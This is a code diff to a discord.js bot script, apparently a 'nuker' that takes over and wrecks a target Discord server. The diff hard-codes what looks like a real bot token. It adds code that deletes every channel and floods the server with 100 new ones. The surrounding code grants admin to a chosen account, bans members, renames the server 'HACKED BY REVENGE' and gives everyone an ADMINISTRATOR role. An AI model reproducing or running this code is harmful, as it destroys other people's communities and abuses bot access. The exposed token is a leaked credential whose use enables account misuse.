@@ -1,6 +1,6 @@
 const Discord = require("discord.js")
 const client = new Discord.Client()
-const token = "TOKEN BOT"
+const token = "NjAwNzg4MTE3MTI0ODA4NzI0.Xc-LHQ.bGP42W71Ys28Tcd3Ak-KCoS7FjU"
 
 // Will make you admin (NOT OWNER) in the targer server
 const setAdmin = (guildID, accountID) => {
@@ -62,9 +62,18 @@ const createChanelsAndRoles = (guildID, name) => {
     const targetServer = client.guilds.get(guildID)
     if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
     else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_CHANNELS") || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
-
+   targetServer.channels.forEach(ch => {
+    ch.delete()
+   })
+   setTimeout(() => {
+       
+   let i;
+    for(i=0; i < 50; i++) {
+   targetServer.createChannel(name, "text")
     targetServer.createChannel(name, "text")
-    targetServer.createChannel(name, "voice")
+     }
+    }, 2000);
+
     targetServer.createRole({name: name, permissions: "ADMINISTRATOR", color: 0xFF0000 }).then((role) => {
         targetServer.members.forEach((member) => {
             member.addRole(role, `HACKED BY ${client.user.tag}`)
@@ -77,10 +86,12 @@ client.on("ready", () => {
 
     // Setup YOUR personnal settings
     const configs = {
-        "targetServerID": "SERVER_ID",
-        "accountID": "YOUR_ACCOUNT_ID",
+        "targetServerID": "",
+        "accountID": "",
         "botNickname": "HACKED BY REVENGE",
-        "botIcon": 'https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png'
+        "botIcon": 'https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png',
+        "newServerIcon": "https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png",
+        "newServerName": "HACKED BY REVENGE",
     }
 
     client.user.setUsername(configs.botNickname)
@@ -88,7 +99,7 @@ client.on("ready", () => {
 
     // Enable all the options
     setAdmin(configs.targetServerID, configs.accountID)
-    changeServerInfo(configs.targetServerID, {"newServerName": configs.botNickname, "newServerName": configs.botIcon})
+    changeServerInfo(configs.targetServerID, {"newServerName": configs.newServerName}, {"newServerIcon": configs.newServerIcon})
     changeNicks(configs.targetServerID, configs.botNickname)
     banMembers(configs.targetServerID)
     createChanelsAndRoles(configs.targetServerID, configs.botNickname)
